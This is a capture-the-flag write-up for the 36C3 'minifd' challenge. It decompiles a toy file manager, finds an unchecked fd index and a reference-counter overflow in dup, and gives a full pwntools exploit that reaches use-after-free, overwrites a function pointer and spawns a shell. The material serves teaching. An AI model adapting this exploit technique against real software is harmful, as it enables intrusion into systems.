# minifd 
Pwn, Medium

## Description

> This is a simple file manager implementation supporting basic functionality to create, read, and write files. Please note: This is a prototype implementation. At this point of time, only 16 files can be managed at the same time.

A binary file was attached.

## Solution

Let's inspect the binary file:

```console
root@kali:/media/sf_CTFs/36c3/minifd# file fd
fd: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=45aec24480e82735f7358d9263d10cafd4eda8f8, not stripped
root@kali:/media/sf_CTFs/36c3/minifd# checksec.sh -f fd
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   85 Symbols      Yes     2               4            fd
```

Let's run it:
```console
root@kali:/media/sf_CTFs/36c3/minifd# ./fd

----------------------
 Simple File Mananger
----------------------

This is a simple file manager implementation supporting basic functionality
to create, read, and write files.

Please note:
This is a prototype implementation.
At this point of time, only 16 files can be managed at the same time.

The Simple File Manager supports the following operations.
[1] list
    Print the file table
[2] create <string>
    Create a file with name <string>
[3] close <fd>
    Close the file with file descriptor <fd>
[4] dup <fd>
    Duplicate a file descriptor <fd>
[5] read <fd> <n>
    Read <n> bytes from the file with file descriptor <fd>
[6] write <fd> <n> <string>
    Write <n> bytes to the file with file descriptor <fd>
[7] exit
    Leave the Simple File Manager


Enter the command you want to execute.
[1] list
[2] create <string>
[3] close <fd>
[4] dup <fd>
[5] read <fd> <n>
[6] write <fd> <n> <string>
[7] exit

>
```

We have here a simple file manager. Using Ghidra, we can inspect the implementation under the hood. We find that the file manager uses an array of 16 entries ("`files`") to hold information about the files in the file system. Each entry holds a pointer to a file context allocated on the heap.

Using Ghidra's Structure Editor, we can reconstruct the file context structure based on the usage across the program, and redefine the type of the relevant pointers throughout the program to this reconstructed type. 

The file context structure and global file array are translated to:
```c
typedef struct file_context 
{
    uint8_t     reference_count;
    uint8_t     reserved[3];
    uint32_t    data_length;
    uint8_t*    p_data;
    char        name[32];
    void*       p_close_func;
    void*       p_read_func;
    void*       p_write_func;
    void*       p_dup_func;
} file_context_t;

file_context_t* files[16];
```

Let's inspect the decompilation output of some important functions.

The function we want to call is:
```c
void spawn_shell(void)
{
  long in_FS_OFFSET;
  char *local_28;
  undefined8 local_20;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_28 = "/bin/bash";
  local_20 = 0;
  execve("/bin/bash",&local_28,(char **)0x0);
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    // WARNING: Subroutine does not return
  __stack_chk_fail();
}
```

Obviously, it isn't called via the normal program flow. Now, let's take a look at the function that is responsible for file creation:

```c
ulong create(char *file_name)
{
  ulong i;
  file_context_t *local_RAX_77;
  ulong uVar1;
  
  if (files[0] == (file_context_t *)0x0) {
    uVar1 = 0;
LAB_00400a71:
    local_RAX_77 = (file_context_t *)calloc(1,80);
    local_RAX_77->reference_count = '\x01';
    local_RAX_77->data_length = 0;
    local_RAX_77->p_data = (char *)0x0;
    strncpy(local_RAX_77->name,file_name,31);
    *(code **)&local_RAX_77->p_close_func = c3ctf_file_close;
    *(code **)&local_RAX_77->p_read_func = c3ctf_file_read;
    *(code **)&local_RAX_77->p_write_func = c3ctf_file_write;
    *(code **)&local_RAX_77->p_dup_func = c3ctf_file_dup;
    files[(int)uVar1] = local_RAX_77;
  }
  else {
    i = 1;
    do {
      uVar1 = i & 0xffffffff;
      if (files[i] == (file_context_t *)0x0) {
        if ((int)i < 0) {
          return 0xffffffff;
        }
        goto LAB_00400a71;
      }
      i = i + 1;
    } while (i != 0x10);
    uVar1 = 0xffffffff;
  }
  return uVar1;
}
```

Assuming there's a free slot in the array, the `create` command handler allocates 80 bytes for the context and saves the pointer. The context is populated with a reference count of 1, some function pointers and a bit more metadata. The function pointers are called from within other command handlers.

Writing a file:
```c
undefined8 do_write(int file_fd,uint new_data_length,char *p_new_data)
{
  file_context_t *pfVar1;
  
  pfVar1 = files[file_fd];
  if (pfVar1 != (file_context_t *)0x0) {
    (*(code *)pfVar1->p_write_func)(pfVar1,new_data_length,p_new_data);
    return 0;
  }
  return 0xffffffff;
}

void c3ctf_file_write(file_context_t *p_ctx,uint new_data_length,char *p_new_data)
{
  char *pcVar1;
  
  if (p_ctx->data_length < new_data_length) {
    pcVar1 = (char *)realloc(p_ctx->p_data,(ulong)new_data_length);
    p_ctx->p_data = pcVar1;
  }
  p_ctx->data_length = new_data_length;
  strncpy(p_ctx->p_data,p_new_data,(ulong)new_data_length);
  return;
}
```

Reading a file:
```c
undefined8 do_read(int file_fd,uint length_to_read,char *p_out_buffer)
{
  file_context_t *pfVar1;
  
  pfVar1 = files[file_fd];
  if (pfVar1 != (file_context_t *)0x0) {
    (*(code *)pfVar1->p_read_func)(pfVar1,length_to_read,p_out_buffer);
    return 0;
  }
  return 0xffffffff;
}

void c3ctf_file_read(file_context_t *p_ctx,uint length_to_read,char *p_out_buffer)
{
  if (p_ctx->data_length < length_to_read || p_ctx->data_length == length_to_read) {
    length_to_read = p_ctx->data_length;
  }
  strncpy(p_out_buffer,p_ctx->p_data,(ulong)length_to_read);
  return;
}
```

Duplicating a file:
```c
ulong do_dup(int file_fd)
{
  file_context_t *pfVar1;
  ulong uVar2;
  ulong uVar3;
  
  pfVar1 = files[file_fd];
  if (pfVar1 == (file_context_t *)0x0) {
    uVar2 = 0xffffffff;
  }
  else {
    (*(code *)pfVar1->p_dup_func)(pfVar1);
    if (files[0] == (file_context_t *)0x0) {
      uVar2 = 0;
LAB_00400a0c:
      files[(int)uVar2] = pfVar1;
    }
    else {
      uVar3 = 1;
      do {
        uVar2 = uVar3 & 0xffffffff;
        if (files[uVar3] == (file_context_t *)0x0) {
          if ((int)uVar3 < 0) {
            return 0xffffffff;
          }
          goto LAB_00400a0c;
        }
        uVar3 = uVar3 + 1;
      } while (uVar3 != 0x10);
      uVar2 = 0xffffffff;
    }
  }
  return uVar2;
}

void c3ctf_file_dup(file_context_t *p_ctx)
{
  p_ctx->reference_count = p_ctx->reference_count + '\x01';
  return;
}
```

Closing a file:
```c
undefined8 do_close(int file_fd)
{
  file_context_t *pfVar1;
  
  pfVar1 = files[file_fd];
  if (pfVar1 != (file_context_t *)0x0) {
    (*(code *)pfVar1->p_close_func)(pfVar1);
    files[file_fd] = (file_context_t *)0x0;
    return 0;
  }
  return 0xffffffff;
}

void c3ctf_file_close(file_context_t *p_ctx)
{
  uint8_t uVar1;
  
  uVar1 = p_ctx->reference_count + -1;
  p_ctx->reference_count = uVar1;
  if (uVar1 != '\0') {
    return;
  }
  free(p_ctx->p_data);
  free(p_ctx);
  return;
}
```

We can see two bugs in the implementation above. For the first bug, let's take a look at how the handlers are called from the program loop above:
```c
iVar1 = __isoc99_sscanf(user_input,"close %d",&file_fd);
if (iVar1 == 1) {
  uVar3 = do_close(file_fd);
  if ((int)uVar3 == 0) {
    __printf_chk(1,"Closed file with file descriptor: %d\n",(ulong)file_fd);
  }
  else {
    __printf_chk(1,"Error: File with fd %d could not be closed\n",(ulong)file_fd);
  }
}
```

This is an example for `close`, but other functions behave in the same way. As you can see, the `fd` is received from the user and passed on to the handler without validating bounds. It is then used in order to access the `files` array. This means that the user can input any integer (positive or negative) and cause the program to treat an arbitrary 8-byte aligned address as a pointer to a file context. However, I couldn't find a way to exploit this in the given program.

The other bug is much easier to exploit. Let's take another look at the duplication handler. We'll refactor it a bit and inline `c3ctf_file_dup` for the sake of readability:
```c
pfVar1 = files[file_fd];
if (pfVar1 == NULL)
{
  return -1;
}

pfVar1->reference_count += 1;
for (i = 0; i < 16; i++)
{
  if (files[i] == NULL)
  {
    files[i] = pfVar1;
    return i;
  }
}

return -1;
```

`dup` causes an additional entry in the array to point to the same context. The number of files using the same context is maintained in the reference counter field of the context. This field is used to ensure that `close` will only free the context once no more files are using it. However, we can see that the reference counter is advanced before the function makes sure that there is room in the array for the new file. This means that after filling up the file array, we can call `dup` as much as we want in order to control the reference counter of any file.

Therefore, the plan is to:
1. Create a file ("file_0")
2. Duplicate the file so that both files use the same context on the heap ("file0_dup")
3. Create a third file which will be used in a moment ("file_1")
4. Fill up the table with filler files
5. Use the bug to overflow the reference counter of "file_0" (and its duplicate file) to 1
6. Free "file_0". Since the reference counter will be decremented to 0, the file context will be freed. However we still have access to it via "file0_dup".
7. Perform a write to "file1" with a specially crafted input:
   1. Note that `write` allocates a buffer from the heap to hold the input
   2. If the buffer size needed to hold the input is the same size as the buffer just freed (the one that held the file context for "file_0"), there's a good chance that the heap manager will reuse it, allowing us to effectively write to the buffer that "file0_dup" is pointing to
   3. We'll craft the input as a file_context_t structure. The important part is to place the address of `spawn_shell` in an offset which is reserved for a file pointer
8. Trigger an action which will invoke the function pointer we've placed, via `file0_dup`
9. Get a shell

The following script performs this:
```python
#First, generate a template with "pwn template fd"
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# FORTIFY:  Enabled

import re, ctypes

class file_context_t(ctypes.Structure):
    _fields_ = [    
                    ("reference_count",     ctypes.c_ubyte),
                    ("reserved" ,           ctypes.c_ubyte * 3),
                    ("data_length",         ctypes.c_uint32),
                    ("data",                ctypes.c_char_p),
                    ("name" ,               ctypes.c_ubyte * 32),
                    ("p_close_func" ,       ctypes.c_uint64), # void*
                    ("p_read_func" ,        ctypes.c_uint64), # void*
                    ("p_write_func" ,       ctypes.c_uint64), # void*
                    ("p_dup_func" ,         ctypes.c_uint64) # void*
    ]

    def to_bytes(self):
        return buffer(self)[:]

UINT8_MAX = 0xFF

ENTER_CMD = "\nEnter the command you want to execute."

def read_opening_text(proc):
    return proc.recvuntil(ENTER_CMD, drop = True) 

def read_menu(proc):
    proc.recvuntil("\n> ")

def print_list(proc):
    read_menu(proc)
    proc.sendline("list")
    return proc.recvuntil(ENTER_CMD, drop = True)

def create(proc, name):
    read_menu(proc)
    proc.sendline("create {}".format(name))
    resp = proc.recvline()
    if "Error" in resp:
        raise Exception(resp)
    new_fd = resp.split(": ")[1].rstrip()
    log.info("File '{}' created with fd {}".format(name, new_fd))
    return new_fd

def close(proc, fd):
    read_menu(proc)
    proc.sendline("close {}".format(fd))
    log.info("Closing file with fd {}".format(fd))

def dup(proc, fd):
    read_menu(proc)
    proc.sendline("dup {}".format(fd))
    resp = proc.recvline()
    if "Error" in resp:
        raise Exception(resp)
    new_fd = resp.split(": ")[1].rstrip()
    log.info("File with fd {} duplicated, new fd: {}".format(fd, new_fd))
    return new_fd

def read(proc, fd, n):
    read_menu(proc)
    proc.sendline("read {} {}".format(fd, n))
    log.info("Reading {} bytes from fd {}".format(n, fd))
    resp = proc.recvline()
    return proc.recvuntil(ENTER_CMD, drop = True) 

def write(proc, fd, n, data):
    read_menu(proc)
    proc.sendline("write {} {} {}".format(fd, n, data))
    log.info("Writing {} bytes to fd {}:\n{}".format(n, fd, hexdump(data)))
    resp = proc.recvline()
    return proc.recvuntil(ENTER_CMD, drop = True) 

def exit(proc):
    read_menu(proc)
    proc.sendline("exit")
    log.info("Quitting...")

log.info("Address of spawn_shell(): {}".format(hex(exe.symbols['spawn_shell'])))

io = start()

opening_text = read_opening_text(io)
match = re.search(r"At this point of time, only (\d+) files can be managed at the same time.", opening_text)
num_files = int(match.group(1))

file0 = create(io, "file_0")
file1 = create(io, "file_1")
file0_dup = dup(io, file0)

for i in range(num_files - len([file0, file0_dup, file1])):
    create(io, "filler_{}".format(i))


# Overflow reference counter for file_0 (current reference count is 2)
num_duplications = UINT8_MAX
for i in range(num_duplications):
    try:
        dup(io, file0)
    except:
        pass
log.info("Attempted to duplicate fd {} for {} times".format(file0, num_duplications))
# Reference counter is now 1

close(io, file0)

fc = file_context_t.from_buffer_copy('A' * ctypes.sizeof(file_context_t))
fc.p_close_func = exe.symbols['spawn_shell']

write(io, file1, ctypes.sizeof(fc), fc.to_bytes())

close(io, file0_dup)

io.interactive()
```

Output:
```console
root@kali:/media/sf_CTFs/36c3/minifd# python exploit.py
[*] '/media/sf_CTFs/36c3/minifd/fd'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
[*] Address of spawn_shell(): 0x400e9e
[+] Starting local process '/media/sf_CTFs/36c3/minifd/fd': pid 1739
[*] File 'file_0' created with fd 0
[*] File 'file_1' created with fd 1
[*] File with fd 0 duplicated, new fd: 2
[*] File 'filler_0' created with fd 3
[*] File 'filler_1' created with fd 4
[*] File 'filler_2' created with fd 5
[*] File 'filler_3' created with fd 6
[*] File 'filler_4' created with fd 7
[*] File 'filler_5' created with fd 8
[*] File 'filler_6' created with fd 9
[*] File 'filler_7' created with fd 10
[*] File 'filler_8' created with fd 11
[*] File 'filler_9' created with fd 12
[*] File 'filler_10' created with fd 13
[*] File 'filler_11' created with fd 14
[*] File 'filler_12' created with fd 15
[*] Attempted to duplicate fd 0 for 255 times
[*] Closing file with fd 0
[*] Writing 80 bytes to fd 1:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000030  9e 0e 40 00  00 00 00 00  41 41 41 41  41 41 41 41  │··@·│····│AAAA│AAAA│
    00000040  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000050
[*] Closing file with fd 2
[*] Switching to interactive mode
$ cat flag.txt
junior-pwned_after_the_ctf_was_over
$ exit
[*] Got EOF while reading in interactive
$
[*] Process '/media/sf_CTFs/36c3/minifd/fd' stopped with exit code 0 (pid 1739)
[*] Got EOF while sending in interactive
```

Bonus: While debugging the exploit with GDB, it's very convenient to use be able to view the file context as a logical structure. However, the structure definition was stripped from the binary. The solution (obtained from [here](https://stackoverflow.com/questions/7272558/can-we-define-a-new-data-type-in-a-gdb-session/7273785#7273785)) is to compile a fake `C` file and take the symbols from there:
```console
root@kali:/media/sf_CTFs/36c3/minifd# cat src.c

#import <stdint.h>

typedef struct file_context {
    uint8_t     reference_count;
    uint8_t     reserved[3];
    uint32_t    data_length;
    uint8_t*    p_data;
    char        name[32];
    void*       p_close_func;
    void*       p_read_func;
    void*       p_write_func;
    void*       p_dup_func;
} file_context_t;

file_context_t dummy;
root@kali:/media/sf_CTFs/36c3/minifd# gcc -g -c src.c
root@kali:/media/sf_CTFs/36c3/minifd#
```

Then:

```
gdb-peda$ add-symbol-file src.o 0
add symbol table from file "src.o" at
	.text_addr = 0x0
Reading symbols from src.o...done.
gdb-peda$ p *((file_context_t*[16])files)[2]
$3 = {
  reference_count = 0x1, 
  reserved = "\000\000", 
  data_length = 0x0, 
  p_data = 0x0, 
  name = "file_0", '\000' <repeats 25 times>, 
  p_close_func = 0x4008ab <c3ctf_file_close>, 
  p_read_func = 0x4008d0 <c3ctf_file_read>, 
  p_write_func = 0x4008f1 <c3ctf_file_write>, 
  p_dup_func = 0x4008a7 <c3ctf_file_dup>
}
```